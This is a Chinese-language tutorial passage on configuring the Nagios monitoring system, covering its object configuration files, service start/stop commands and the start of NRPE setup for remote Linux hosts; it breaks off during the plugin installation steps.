<p><span>&nbsp;为了能更清楚的说明问题，同时也为了维护方便，建议将nagios各个定义对象创建独立的配置文件：</span></p>




<ul>

<li><span>&nbsp;创建hosts.cfg文件来定义主机和主机组</span></li>

<li><span>&nbsp;创建services.cfg文件来定义服务</span></li>

<li><span>&nbsp;用默认的contacts.cfg文件来定义联系人和联系人组</span></li>

<li><span>&nbsp;用默认的commands.cfg文件来定义命令</span></li>

<li><span>&nbsp;用默认的timeperiods.cfg来定义监控时间段</span></li>

<li><span>&nbsp;用默认的templates.cfg文件作为资源引用文件</span></li>













































</ul>




<p>a. templates.cfg文件</p>




<p><span>nagios主要用于监控主机资源以及服务，在nagios配置中称为对象，为了不必重复定义一些监控对象，Nagios引入了一个模板配置文件，将一些共性的属性定义成模板，以便于多次引用。这就是templates.cfg的作用。</span></p>




<p><span>下面详细介绍下templates.cfg文件中每个参数的含义：</span></p>




<div class="cnblogs_code">

<pre><span style="color: #000000;">define contact{

        name                            generic-contact    ; 联系人名称

        service_notification_period     24x7               ; <span>当服务出现异常时，发送通知的时间段，这个时间段"24x7"在timeperiods.cfg文件中定义</span>

        host_notification_period        24x7               ; <span>当主机出现异常时，发送通知的时间段，这个时间段"24x7"在timeperiods.cfg文件中定义</span>

        service_notification_options    w,u,c,r            ; <span>这个定义的是&ldquo;通知可以被发出的情况&rdquo;。w即warn，表示警告状态，u即unknown，表示不明状态;<br />                                                           ; c即criticle，表示紧急状态，r即recover，表示恢复状态;<br />                                                           ; 也就是在服务出现警告状态、未知状态、紧急状态和重新恢复状态时都发送通知给使用者。</span>

        host_notification_options       d,u,r                   ; <span>定义主机在什么状态下需要发送通知给使用者，d即down，表示宕机状态;<br />                                                                ; u即unreachable，表示不可到达状态，r即recovery，表示重新恢复状态。</span>

        service_notification_commands   notify-service-by-email ; <span>服务故障时，发送通知的方式，可以是邮件和短信，这里发送的方式是邮件;<br />                                                                ; 其中&ldquo;notify-service-by-email&rdquo;在commands.cfg文件中定义。</span>

        host_notification_commands      notify-host-by-email    ; <span>主机故障时，发送通知的方式，可以是邮件和短信，这里发送的方式是邮件;<br />                                                                ; 其中&ldquo;notify-host-by-email&rdquo;在commands.cfg文件中定义。 </span>

        register                        0                    ; DONT REGISTER THIS DEFINITION - ITS NOT A REAL CONTACT, JUST A TEMPLATE!

        }

define host{

        name                            generic-host    ; <span>主机名称，这里的主机名，并不是直接对应到真正机器的主机名;<br />                                                        ; 乃是对应到在主机配置文件里所设定的主机名。</span>

        notifications_enabled           1               ; Host notifications are enabled

        event_handler_enabled           1               ; Host event handler is enabled

        flap_detection_enabled          1               ; Flap detection is enabled

        failure_prediction_enabled      1               ; Failure prediction is enabled

        process_perf_data               1               ; 其值可以为0或1，其作用为是否启用Nagios的数据输出功能;<br />                                                        ; 如果将此项赋值为1，那么Nagios就会将收集的数据写入某个文件中，以备提取。

        retain_status_information       1               ; Retain status information across program restarts

        retain_nonstatus_information    1               ; Retain non-status information across program restarts

        notification_period             24x7            ; <span>指定&ldquo;发送通知&rdquo;的时间段，也就是可以在什么时候发送通知给使用者。</span>

        register                        0               ; DONT REGISTER THIS DEFINITION - ITS NOT A REAL HOST, JUST A TEMPLATE!

        }

define host{

        name                            linux-server    ; <span>主机名称</span>

        use                             generic-host    ; <span>use表示引用，也就是将主机generic-host的所有属性引用到linux-server中来;<br />                                                        ; 在nagios配置中，很多情况下会用到引用。</span>

        check_period                    24x7            ; <span>这里的check_period告诉nagios检查主机的时间段</span>

        check_interval                  5               ; <span>nagios对主机的检查时间间隔，这里是5分钟。</span>

        retry_interval                  1               ; <span>重试检查时间间隔，单位是分钟。</span>

        max_check_attempts              10              ; <span>nagios对主机的最大检查次数，也就是nagios在检查发现某主机异常时，并不马上判断为异常状况;<br />                                                        ; 而是多试几次，因为有可能只是一时网络太拥挤，或是一些其他原因，让主机受到了一点影响;<br />                                                        ; 这里的10就是最多试10次的意思。</span>

        check_command                   check-host-alive ; <span>指定检查主机状态的命令，其中&ldquo;check-host-alive&rdquo;在commands.cfg文件中定义。</span>

        notification_period             24x7            ; <span>主机故障时，发送通知的时间范围，其中&ldquo;workhours&rdquo;在timeperiods.cfg中进行了定义;<br />                                                        ; 下面会陆续讲到。</span>

        notification_interval           10              ; <span>在主机出现异常后，故障一直没有解决，nagios再次对使用者发出通知的时间。单位是分钟;<br />                                                        ; 如果你觉得，所有的事件只需要一次通知就够了，可以把这里的选项设为0</span>

        notification_options            d,u,r           ; <span>定义主机在什么状态下可以发送通知给使用者，d即down，表示宕机状态;<br />                                                        ; u即unreachable，表示不可到达状态;<br />                                                        ; r即recovery，表示重新恢复状态。</span>

        contact_groups                  ts              ; <span>指定联系人组，这个&ldquo;admins&rdquo;在contacts.cfg文件中定义。</span>

        register                        0               ; DONT REGISTER THIS DEFINITION - ITS NOT A REAL HOST, JUST A TEMPLATE!

        }

define host{

        name                    windows-server  ; The name of this host template

        use                     generic-host    ; Inherit default values from the generic-host template

        check_period            24x7            ; By default, Windows servers are monitored round the clock

        check_interval          5               ; Actively check the server every 5 minutes

        retry_interval          1               ; Schedule host check retries at 1 minute intervals

        max_check_attempts      10              ; Check each server 10 times (max)

        check_command           check-host-alive        ; Default command to check if servers are "alive"

        notification_period     24x7            ; Send notification out at any time - day or night

        notification_interval   10              ; Resend notifications every 30 minutes

        notification_options    d,r             ; Only send notifications for specific host states

        contact_groups          ts              ; Notifications get sent to the admins by default

        hostgroups              windows-servers ; Host groups that Windows servers should be a member of

        register                0               ; DONT REGISTER THIS - ITS JUST A TEMPLATE

        }

define service{

        name                            generic-service         ; <span>定义一个服务名称</span>

        active_checks_enabled           1                       ; Active service checks are enabled

        passive_checks_enabled          1                       ; Passive service checks are enabled/accepted

        parallelize_check               1                       ; Active service checks should be parallelized;<br />                                                                ; (disabling this can lead to major performance problems)

        obsess_over_service             1                       ; We should obsess over this service (if necessary)

        check_freshness                 0                       ; Default is to NOT check service 'freshness'

        notifications_enabled           1                       ; Service notifications are enabled

        event_handler_enabled           1                       ; Service event handler is enabled

        flap_detection_enabled          1                       ; Flap detection is enabled

        failure_prediction_enabled      1                       ; Failure prediction is enabled

        process_perf_data               1                       ; Process performance data

        retain_status_information       1                       ; Retain status information across program restarts

        retain_nonstatus_information    1                       ; Retain non-status information across program restarts

        is_volatile                     0                       ; The service is not volatile

        check_period                    24x7             ; <span>这里的check_period告诉nagios检查服务的时间段。</span>

        max_check_attempts              3                ; <span>nagios对服务的最大检查次数。</span>

        normal_check_interval           5                ; <span>此选项是用来设置服务检查时间间隔，也就是说，nagios这一次检查和下一次检查之间所隔的时间;<br />                                                         ; 这里是5分钟。</span>

        retry_check_interval            2                ; <span>重试检查时间间隔，单位是分钟。</span>

        contact_groups                  ts           ; <span>指定联系人组</span>

        notification_options            w,u,c,r          ; <span>这个定义的是&ldquo;通知可以被发出的情况&rdquo;。w即warn，表示警告状态;<br />                                                         ; u即unknown，表示不明状态;<br />                                                         ; c即criticle，表示紧急状态，r即recover，表示恢复状态;<br />                                                         ; 也就是在服务出现警告状态、未知状态、紧急状态和重新恢复后都发送通知给使用者。</span>

        notification_interval           10               ; Re-notify about service problems every hour

        notification_period             24x7             ; <span>指定&ldquo;发送通知&rdquo;的时间段，也就是可以在什么时候发送通知给使用者。</span>

        register                        0                ; DONT REGISTER THIS DEFINITION - ITS NOT A REAL SERVICE, JUST A TEMPLATE!

        }

define service{

        name                            local-service           ; The name of this service template

        use                             generic-service         ; Inherit default values from the generic-service definition

        max_check_attempts              4             ; Re-check the service up to 4 times in order to determine its final (hard) state

        normal_check_interval           5             ; Check the service every 5 minutes under normal conditions

        retry_check_interval            1             ; Re-check the service every minute until a hard state can be determined

        register                        0             ; DONT REGISTER THIS DEFINITION - ITS NOT A REAL SERVICE, JUST A TEMPLATE!

        }</span></pre>

</div>




<p>b.&nbsp;<span>resource.cfg文件</span></p>




<p><span>resource.cfg是nagios的变量定义文件，文件内容只有一行：</span></p>




<div class="cnblogs_code">

<pre>$USER1$=/usr/local/nagios/libexec</pre>

</div>




<p>其中，变量$USER1$指定了安装nagios插件的路径，如果把插件安装在了其它路径，只需在这里进行修改即可。需要注意的是，变量必须先定义，然后才能在其它配置文件中进行引用。</p>




<p>c. commands.cfg文件</p>




<p><span>此文件默认是存在的，无需修改即可使用，当然如果有新的命令需要加入时，在此文件进行添加即可。</span></p>




<div class="cnblogs_code">

<pre><span style="color: #000000;"><span>#notify-host-by-email命令的定义 </span><br />define command{

        command_name    notify-host-by-email             <span>#命令名称，即定义了一个主机异常时发送邮件的命令。</span>

        command_line    /usr/bin/printf "%b" "***** Nagios *****\n\nNotification Type: $NOTIFICATIONTYPE$\nHost: $HOSTNAME$\nState: $HOSTSTATE$\nAddress: $HOSTADDRESS$\nInfo: $HOSTOUTPUT$\n\nDate/Time: $LONGDATETIME$\n" | /bin/mail -s "** $NOTIFICATIONTYPE$ Host Alert: $HOSTNAME$ is $HOSTSTATE$ **" $CONTACTEMAIL$                                     <span>#命令具体的执行方式。</span>

        }

<span>#notify-service-by-email命令的定义 </span><br />define command{

        command_name    notify-service-by-email          <span>#命令名称，即定义了一个服务异常时发送邮件的命令</span>

        command_line    /usr/bin/printf "%b" "***** Nagios *****\n\nNotification Type: $NOTIFICATIONTYPE$\n\nService: $SERVICEDESC$\nHost: $HOSTALIAS$\nAddress: $HOSTADDRESS$\nState: $SERVICESTATE$\n\nDate/Time: $LONGDATETIME$\n\nAdditional Info:\n\n$SERVICEOUTPUT$\n" | /bin/mail -s "** $NOTIFICATIONTYPE$ Service Alert: $HOSTALIAS$/$SERVICEDESC$ is $SERVICESTATE$ **" $CONTACTEMAIL$

        }<br />#check-host-alive命令的定义

define command{

        command_name    check-host-alive                 #<span>命令名称，用来检测主机状态。</span>

        command_line    $USER1$/check_ping -H $HOSTADDRESS$ -w 3000.0,80% -c 5000.0,100% -p 5             <br />                        # <span>这里的变量$USER1$在resource.cfg文件中进行定义，即$USER1$=/usr/local/nagios/libexec;<br /></span><span style="line-height: 1.5;">                        # 那么check_ping的完整路径为/usr/local/nagios/libexec/check_ping;<br />                        #&nbsp;&ldquo;-w&nbsp;3000.0,80%&rdquo;中&ldquo;-w&rdquo;说明后面的一对值对应的是&ldquo;WARNING&rdquo;状态，&ldquo;80%&rdquo;是其临界值。<br />                        # &ldquo;-c&nbsp;5000.0,100%&rdquo;中&ldquo;-c&rdquo;说明后面的一对值对应的是&ldquo;CRITICAL&rdquo;，&ldquo;100%&rdquo;是其临界值。<br />                        # &ldquo;-p&nbsp;1&rdquo;说明每次探测发送一个包。</span><span><br /></span>        }

define command{

        command_name    check_local_disk

        command_line    $USER1$/check_disk -w $ARG1$ -c $ARG2$ -p $ARG3$            <span>#$ARG1$是指在调用这个命令的时候，命令后面的第一个参数。</span>

        }

define command{

        command_name    check_local_load

        command_line    $USER1$/check_load -w $ARG1$ -c $ARG2$

        }

define command{

        command_name    check_local_procs

        command_line    $USER1$/check_procs -w $ARG1$ -c $ARG2$ -s $ARG3$

        }

define command{

        command_name    check_local_users

        command_line    $USER1$/check_users -w $ARG1$ -c $ARG2$

        }

define command{

        command_name    check_local_swap

        command_line    $USER1$/check_swap -w $ARG1$ -c $ARG2$

        }

define command{

        command_name    check_ftp

        command_line    $USER1$/check_ftp -H $HOSTADDRESS$ $ARG1$

        }

define command{

        command_name    check_http

        command_line    $USER1$/check_http -I $HOSTADDRESS$ $ARG1$

        }

define command{

        command_name    check_ssh

        command_line    $USER1$/check_ssh $ARG1$ $HOSTADDRESS$

        }

define command{

        command_name    check_ping

        command_line    $USER1$/check_ping -H $HOSTADDRESS$ -w $ARG1$ -c $ARG2$ -p 5

        }

define command{

        command_name    check_nt

        command_line    $USER1$/check_nt -H $HOSTADDRESS$ -p 12489 -v $ARG1$ $ARG2$

        }<br /></span></pre>

</div>




<p>d.&nbsp;<span>hosts.cfg文件</span></p>




<p><span>此文件默认不存在，需要手动创建，hosts.cfg主要用来指定被监控的主机地址以及相关属性信息，根据实验目标配置如下：</span></p>




<div class="cnblogs_code">

<pre><span style="color: #000000;">define host{   

        use                     linux-server          <span>#引用主机linux-server的属性信息，linux-server主机在templates.cfg文件中进行了定义。</span>

        host_name               Nagios-Linux          <span>#主机名</span>

        alias                   Nagios-Linux          <span>#主机别名</span>

        address                 192.168.1.111         <span>#被监控的主机地址，这个地址可以是ip，也可以是域名。</span>

        }  </span> </pre>

<pre><span style="color: #000000;"><span>#定义一个主机组</span>   

define hostgroup{      

        hostgroup_name          bsmart-servers        <span>#主机组名称，可以随意指定。</span>

        alias                   bsmart servers        <span>#主机组别名</span>

        members                 Nagios-Linux          <span>#主机组成员，其中&ldquo;Nagios-Linux&rdquo;就是上面定义的主机。</span>     <br />        }</span></pre>

</div>




<p><strong>注意：</strong>在/usr/local/nagios/etc/<span>objects 下默认有localhost.cfg 和windows.cfg 这两个配置文件，localhost.cfg 文件是定义监控主机本身的，windows.cfg 文件是定义windows 主机的，其中包括了对host 和相关services 的定义。所以在本次实验中，将直接在localhost.cfg 中定义监控主机（Nagios-Server），在windows.cfg中定义windows 主机（Nagios-Windows）。根据自己的需要修改其中的相关配置，详细如下：</span></p>




<p><span>localhost.cfg</span></p>




<div class="cnblogs_code">

<pre><span style="color: #000000;">define host{

        use                     linux-server            ; Name of host template to use

                                                        ; This host definition will inherit all variables that are defined

                                                        ; in (or inherited by) the linux-server host template definition.

        host_name               Nagios-Server

        alias                   Nagios-Server

        address                 127.0.0.1

        }

define hostgroup{

        hostgroup_name  linux-servers ; The name of the hostgroup

        alias           Linux Servers ; Long name of the group

        members         Nagios-Server ; Comma separated list of hosts that belong to this group

        }

define service{

        use                             local-service         ; Name of service template to use

        host_name                       Nagios-Server

        service_description             PING

        check_command                   check_ping!100.0,20%!500.0,60%

        }

define service{

        use                             local-service         ; Name of service template to use

        host_name                       Nagios-Server

        service_description             Root Partition

        check_command                   check_local_disk!20%!10%!/

        }

define service{

        use                             local-service         ; Name of service template to use

        host_name                       Nagios-Server

        service_description             Current Users

        check_command                   check_local_users!20!50

        }

define service{

        use                             local-service         ; Name of service template to use

        host_name                       Nagios-Server

        service_description             Total Processes

        check_command                   check_local_procs!250!400!RSZDT

        }

define service{

        use                             local-service         ; Name of service template to use

        host_name                       Nagios-Server

        service_description             Current Load

        check_command                   check_local_load!5.0,4.0,3.0!10.0,6.0,4.0

        }

define service{

        use                             local-service         ; Name of service template to use

        host_name                       Nagios-Server

        service_description             Swap Usage

        check_command                   check_local_swap!20!10

        }

define service{

        use                             local-service         ; Name of service template to use

        host_name                       Nagios-Server

        service_description             SSH

        check_command                   check_ssh

        notifications_enabled           0

        }

define service{

        use                             local-service         ; Name of service template to use

        host_name                       Nagios-Server

        service_description             HTTP

        check_command                   check_http

        notifications_enabled           0

        }</span></pre>

</div>




<p><span style="line-height: 1.5;">windows.cfg</span></p>




<div class="cnblogs_code">

<pre><span style="color: #000000;">define host{

        use             windows-server  ; Inherit default values from a template

        host_name       Nagios-Windows  ; The name we're giving to this host

        alias           My Windows Server       ; A longer name associated with the host

        address         192.168.1.113   ; IP address of the host

        }

define hostgroup{

        hostgroup_name  windows-servers ; The name of the hostgroup

        alias           Windows Servers ; Long name of the group

        }

define service{

        use                     generic-service

        host_name               Nagios-Windows

        service_description     NSClient++ Version

        check_command           check_nt!CLIENTVERSION

        }

define service{

        use                     generic-service

        host_name               Nagios-Windows

        service_description     Uptime

        check_command           check_nt!UPTIME

        }

define service{

        use                     generic-service

        host_name               Nagios-Windows

        service_description     CPU Load

        check_command           check_nt!CPULOAD!-l 5,80,90

        }

define service{

        use                     generic-service

        host_name               Nagios-Windows

        service_description     Memory Usage

        check_command           check_nt!MEMUSE!-w 80 -c 90

        }

define service{

        use                     generic-service

        host_name               Nagios-Windows

        service_description     C:\ Drive Space

        check_command           check_nt!USEDDISKSPACE!-l c -w 80 -c 90

        }

define service{

        use                     generic-service

        host_name               Nagios-Windows

        service_description     W3SVC

        check_command           check_nt!SERVICESTATE!-d SHOWALL -l W3SVC

        }

define service{

        use                     generic-service

        host_name               Nagios-Windows

        service_description     Explorer

        check_command           check_nt!PROCSTATE!-d SHOWALL -l Explorer.exe

        }</span></pre>

</div>




<p><span style="line-height: 1.5;">e.&nbsp;</span><span style="line-height: 1.5;">services.cfg文件</span></p>




<p><span>此文件默认也不存在，需要手动创建，services.cfg文件主要用于定义监控的服务和主机资源，例如监控http服务、ftp服务、主机磁盘空间、主机系统负载等等。Nagios-Server 和Nagios-Windows 相关服务已在相应的配置文件中定义，所以这里只需要定义Nagios-Linux 相关服务即可，这里只定义一个检测是否存活的服务来验证配置文件的正确性，其他服务的定义将在后面讲到。</span></p>




<div class="cnblogs_code">

<pre><span style="color: #000000;">define service{  

        use                     local-service          <span>#引用local-service服务的属性值，local-service在templates.cfg文件中进行了定义。</span>

        host_name               Nagios-Linux           #<span>指定要监控哪个主机上的服务，&ldquo;Nagios-Server&rdquo;在hosts.cfg文件中进行了定义。</span>

        service_description     check-host-alive       <span>#对监控服务内容的描述，以供维护人员参考。</span>

        check_command           check-host-alive       <span>#指定检查的命令。<br /></span>        }  <br /></span></pre>

</div>




<p>f.&nbsp;contacts.cfg文件</p>




<p>contacts.cfg是一个定义联系人和联系人组的配置文件，当监控的主机或者服务出现故障，nagios会通过指定的通知方式（邮件或者短信）将信息发给这里指定的联系人或者使用者。</p>




<div class="cnblogs_code">

<pre><span>define contact{

        contact_name                    David             #联系人的名称,这个地方不要有空格

        <span>use&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;generic-contact   <span>#引用generic-contact的属性信息，其中&ldquo;generic-contact&rdquo;在templates.cfg文件中进行定义</span></span>

        alias &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Nagios Admin

        email                           david.tang@bsmart.cn

        }<br /></span></pre>

<pre>define contactgroup{

        contactgroup_name       ts                              #联系人组的名称,同样不能空格

        alias                   Technical Support               #<span>联系人组描述</span>

        members                 David                           #联系人组成员，<span>其中&ldquo;david&rdquo;就是上面定义的联系人，</span>如果有多个联系人则以逗号相隔

        }</pre>

</div>




<p>g.&nbsp;timeperiods.cfg文件</p>




<p><span>此文件只要用于定义监控的时间段，下面是一个配置好的实例：</span></p>




<div class="cnblogs_code">

<pre><span>#下面是定义一个名为24x7的时间段，即监控所有时间段  

define timeperiod{  

        timeperiod_name 24x7       #时间段的名称<span lang="EN-US">,</span>这个地方不要有空格

        alias           24 Hours A Day, 7 Days A Week  

        sunday          00:00-24:00  

        monday          00:00-24:00  

        tuesday         00:00-24:00  

        wednesday       00:00-24:00  

        thursday        00:00-24:00  

        friday          00:00-24:00  

        saturday        00:00-24:00  

        }  

#下面是定义一个名为workhours的时间段，即工作时间段。  

define timeperiod{  

        timeperiod_name workhours   

        alias           Normal Work Hours  

        monday          09:00-17:00  

        tuesday         09:00-17:00  

        wednesday       09:00-17:00  

        thursday        09:00-17:00  

        friday          09:00-17:00  

        }  </span></pre>

</div>




<p>h.&nbsp;cgi.cfg文件</p>




<p>此文件用来控制相关cgi脚本，如果想在nagios的web监控界面执行cgi脚本，例如重启nagios进程、关闭nagios通知、停止nagios主机检测等，这时就需要配置cgi.cfg文件了。<br />由于nagios的web监控界面验证用户为david，所以只需在cgi.cfg文件中添加此用户的执行权限就可以了，需要修改的配置信息如下：</p>




<div class="cnblogs_code">

<pre><span>default_user_name=david

authorized_for_system_information=nagiosadmin,david  

authorized_for_configuration_information=nagiosadmin,david  

authorized_for_system_commands=david

authorized_for_all_services=nagiosadmin,david  

authorized_for_all_hosts=nagiosadmin,david

authorized_for_all_service_commands=nagiosadmin,david  

authorized_for_all_host_commands=nagiosadmin,david</span>&nbsp;</pre>

</div>




<p>i. nagios.cfg文件</p>




<p><span>nagios.cfg默认的路径为/usr/local/nagios/etc/nagios.cfg，是nagios的核心配置文件，所有的对象配置文件都必须在这个文件中进行定义才能发挥其作用，这里只需将对象配置文件在Nagios.cfg文件中进行引用即可。</span></p>




<div class="cnblogs_code">

<pre><span style="color: #000000;">log_file=/usr/local/nagios/var/nagios.log                  # <span>定义nagios日志文件的路径</span>

cfg_file=/usr/local/nagios/etc/objects/commands.cfg        # <span>&ldquo;cfg_file&rdquo;变量用来引用对象配置文件，如果有更多的对象配置文件，在这里依次添加即可。</span><br />cfg_file=/usr/local/nagios/etc/objects/contacts.cfg<br />cfg_file=/usr/local/nagios/etc/objects/hosts.cfg<br /><span class="attribute">cfg_file</span><span>=/usr/local/nagios/etc/objects/services.cfg</span><br />cfg_file=/usr/local/nagios/etc/objects/timeperiods.cfg

cfg_file=/usr/local/nagios/etc/objects/templates.cfg<br />cfg_file=/usr/local/nagios/etc/objects/localhost.cfg       # 本机配置文件<br />cfg_file=/usr/local/nagios/etc/objects/windows.cfg         # windows 主机配置文件

object_cache_file=/usr/local/nagios/var/objects.cache      # <span>该变量用于指定一个&ldquo;所有对象配置文件&rdquo;的副本文件，或者叫对象缓冲文件</span>

precached_object_file=/usr/local/nagios/var/objects.precache<br />resource_file=/usr/local/nagios/etc/resource.cfg           # <span>该变量用于指定nagios资源文件的路径，可以在nagios.cfg中定义多个资源文件。</span>

status_file=/usr/local/nagios/var/status.dat               # <span>该变量用于定义一个状态文件，此文件用于保存nagios的当前状态、注释和宕机信息等。</span>

status_update_interval=10                                  # <span>该变量用于定义状态文件（即status.dat）的更新时间间隔，单位是秒，最小更新间隔是1秒。</span>

nagios_user=nagios                                         # <span>该变量指定了Nagios进程使用哪个用户运行。</span><br />nagios_group=nagios                                        # <span>该变量用于指定Nagios使用哪个用户组运行。</span>

check_external_commands=1                                  # <span>该变量用于设置是否允许nagios在web监控界面运行cgi命令;<br />                                                           # 也就是是否允许nagios在web界面下执行重启nagios、停止主机/服务检查等操作;<br />                                                           # &ldquo;1&rdquo;为运行，&ldquo;0&rdquo;为不允许。</span>

command_check_interval=10s                                 # <span>该变量用于设置nagios对外部命令检测的时间间隔，如果指定了一个数字加一个"s"(如10s);<br />                                                           # 那么外部检测命令的间隔是这个数值以秒为单位的时间间隔;<br />                                                           # 如果没有用"s"，那么外部检测命令的间隔是以这个数值的&ldquo;时间单位&rdquo;的时间间隔。</span><br />interval_length=60                                         # <span>该变量指定了nagios的时间单位，默认值是60秒，也就是1分钟;<br />                                                           # 即在nagios配置中所有的时间单位都是分钟。</span><br /></span></pre>

</div>




<p><span style="line-height: 1.5;">6.4&nbsp;验证Nagios 配置文件的正确性</span></p>




<div>

<p>Nagios 在验证配置文件方面做的非常到位，只需通过一个命令即可完成：</p>

<div class="cnblogs_code">

<pre># /usr/local/nagios/bin/nagios -v /usr/local/nagios/etc/nagios.cfg</pre>

</div>

<div><img style="line-height: 1.5;" src="http://images.cnitblog.com/blog/370046/201302/02004004-c834a48a08f84242b8b762d16f41e548.jpg" alt="" /></div>

<div>&nbsp;</div>

<div><span style="line-height: 1.5;">Nagios提供的这个验证功能非常有用，在错误信息中通常会打印出错误的配置文件以及文件中的哪一行，这使得nagios的配置变得非常容易，报警信息通常是可以忽略的，因为一般那些只是建议性的。</span>&nbsp;</div>

<p>看到上面这些信息就说明没问题了，然后启动Nagios 服务。</p>

<div><span style="font-size: 16px;"><strong><span style="line-height: 1.5; color: #800000;">七、Nagios的启动与停止</span></strong></span></div>

</div>




<p><span style="line-height: 1.5;">7.1 启动Nagios</span></p>




<p><span style="line-height: 1.5;">a.&nbsp;<span>通过初始化脚本启动nagios</span></span></p>




<div class="cnblogs_code">

<pre># /etc/init.d/nagios start<br />or<br /># service nagios start</pre>

</div>




<p><span style="line-height: 1.5;">b.&nbsp;手工方式启动nagios</span></p>




<div>通过nagios命令的&ldquo;-d&rdquo;参数来启动nagios守护进程：</div>




<div class="cnblogs_code">

<pre># /usr/local/nagios/bin/nagios -d /usr/local/nagios/etc/nagios.cfg</pre>

</div>




<p>7.2 重启Nagios</p>




<p>当修改了配置文件让其生效时，需要重启/重载Nagios服务。</p>




<p>a.&nbsp;<span>通过初始化脚本来重启nagios</span></p>




<div class="cnblogs_code">

<pre># /etc/init.d/nagios reload<br />or<br /># /etc/init.d/nagios restart<br />or<br /># service nagios restart</pre>

</div>




<p>b.&nbsp;<span>通过web监控页重启nagios</span></p>




<p>可以通过web监控页的<span>&nbsp;&#8220;Process Info&#8221; -&gt;&nbsp;<span>&#8220;Restart the Nagios process&#8221;来重启nagios</span></span></p>




<p><img src="http://images.cnitblog.com/blog/370046/201302/20112749-13e1fda275164e36bf5f07122d6f6e01.jpg" alt="" /></p>




<p><span><span>c.&nbsp;<span>手工方式平滑重启</span></span></span></p>




<div class="cnblogs_code">

<pre># kill -HUP <span style="color: #0000ff;">&lt;</span><span style="color: #800000;">nagios_pid</span><span style="color: #0000ff;">&gt;</span></pre>

</div>




<p>7.3 停止Nagios</p>




<p>a.&nbsp;<span>通过初始化脚本关闭nagios服务</span></p>




<div class="cnblogs_code">

<pre># /etc/init.d/nagios stop<br />or<br /># service nagios stop</pre>

</div>




<p>b.&nbsp;<span>通过web监控页停止nagios</span></p>




<p>可以通过web监控页的&nbsp;&#8220;Process Info&#8221; -&gt;&nbsp;&#8221;<span>Shutdown the Nagios process</span>&#8220;来停止nagios</p>




<p><img src="http://images.cnitblog.com/blog/370046/201302/20112806-c004f67d89cf441d9ef169804c1b7001.jpg" alt="" /></p>




<p>c. 手工方式停止Nagios</p>




<div class="cnblogs_code">

<pre># kill <span style="color: #0000ff;">&lt;</span><span style="color: #800000;">nagios_pid</span><span style="color: #0000ff;">&gt;</span></pre>

</div>




<p><span style="font-size: 16px;"><strong><span style="line-height: 1.5; color: #800000;">八、查看初步配置情况</span></strong></span></p>




<p><span style="line-height: 1.5;">8.1 启动完成之后，登录Nagios Web监控页<a href="http://172.16.1.124/nagios/">http://192.168.1.108/nagios/</a>&nbsp;查看相关信息。</span></p>




<p><span style="line-height: 1.5;">8.2 点击左面的Current Status -&gt;&nbsp;Hosts 可以看到所定义的三台主机已经全部UP了。</span></p>




<p><span style="line-height: 1.5;"><img src="http://images.cnitblog.com/blog/370046/201302/02005854-29934656840c46fe816b70d8fd0d7f77.jpg" alt="" width="900" /></span></p>




<p><span style="line-height: 1.5;">8.3 点击Current Status -&gt; Services 查看服务监控情况。</span></p>




<p><span style="line-height: 1.5;"><img src="http://images.cnitblog.com/blog/370046/201302/02010233-d29305e56b68490a86216772bbe477dc.jpg" alt="" width="900" /></span></p>




<p><span style="line-height: 1.5;">看到Nagios-Linux和Nagios-Server的服务状态已经OK了，但是Nagios-Windows的服务状态为CRITICAL，Status Information 提示Connection refused。因为Nagios-Windows上还未安装插件，内部服务还无法查看，所以出现这种情况。将在下面具体讲解。</span></p>




<p><span style="font-size: 16px;"><strong><span style="line-height: 1.5; color: #800000;">九、利用NRPE监控远程Linux上的&ldquo;本地信息&rdquo;</span></strong></span></p>




<p><span>上面已经对远程Linux 主机是否存活做了监控，而判断远程机器是否存活，我们可以使用ping 工具对其监测。还有一些远程主机服务，例如ftp、ssh、http，都是对外开放的服务，<span>即使不用N</span><span lang="EN-US">agios，</span><span>我们也可以试的出来，</span><span>随便找一台机器看能不能访问这些服务就行了。</span>但是对于像磁盘容量，</span><span lang="EN-US">cpu</span><span>负载这样的&ldquo;</span><span>本地信息&rdquo;</span><span lang="EN-US">，Nagios</span><span>只能监测自己所在的主机，</span><span>而对其他的机器则显得有点无能为力。</span><span>毕竟没得到被控主机的适当权限是不可能得到这些信息的。</span><span>为了解决这个问题，</span><span lang="EN-US">nagios</span><span>有这样一个附加组件&#8211;&ldquo;</span><span lang="EN-US">NRPE&rdquo;，</span><span>用它就可以完成对L</span><span lang="EN-US">inux&nbsp;</span><span>类型主机&#8221;</span><span>本地信息</span><span lang="EN-US">&rdquo;</span><span>的监控。</span></p>




<p><span>9.1 NRPE 工作原理</span></p>




<p><span><a href="http://images.cnitblog.com/blog/370046/201301/30172018-ee257c664e12472590da4a3b503be33e.png"><img title="nrpe" src="http://images.cnitblog.com/blog/370046/201301/30172019-7263dc2d9c9a40dbaa158ed0969e06d4.png" alt="nrpe" width="483" height="145" border="0" /></a></span></p>




<div align="left">NRPE&nbsp;总共由两部分组成：</div>




<ul>

<li>check_nrpe&nbsp;插件，位于监控主机上</li>

<li>NRPE daemon，运行在远程的Linux主机上(通常就是被监控机)</li>

</ul>




<div align="left">

<p>按照上图，整个的监控过程如下：</p>

<p>当Nagios 需要监控某个远程Linux 主机的服务或者资源情况时：</p>

<ol>

<li>Nagios 会运行check_nrpe 这个插件，告诉它要检查什么；</li>

<li>check_nrpe 插件会连接到远程的NRPE daemon，所用的方式是SSL；</li>

<li>NRPE daemon 会运行相应的Nagios 插件来执行检查；</li>

<li>NRPE daemon 将检查的结果返回给check_nrpe 插件，插件将其递交给nagios做处理。</li>

</ol>

<p>注意：NRPE daemon 需要Nagios 插件安装在远程的Linux主机上，否则，daemon不能做任何的监控。</p>

<p>9.2 在被监控机（Nagios-Linux）上</p>

<p>a. 增加用户&amp;设定密码</p>

<p># useradd nagios</p>

<p># passwd nagios</p>

<p><img src="http://images.cnitblog.com/blog/370046/201302/02152147-18517f8d25c5418c867ea6c95cb39d60.jpg" alt="" /></p>

<p>b. 安装Nagios 插件</p>

<div class="cnblogs_code">

<pre><span style="color: #000000;"># tar zxvf nagios-plugins-1.4.16.tar.gz

# cd nagios-plugins-1.4.16

# ./configure --prefix=/usr/local/nagios

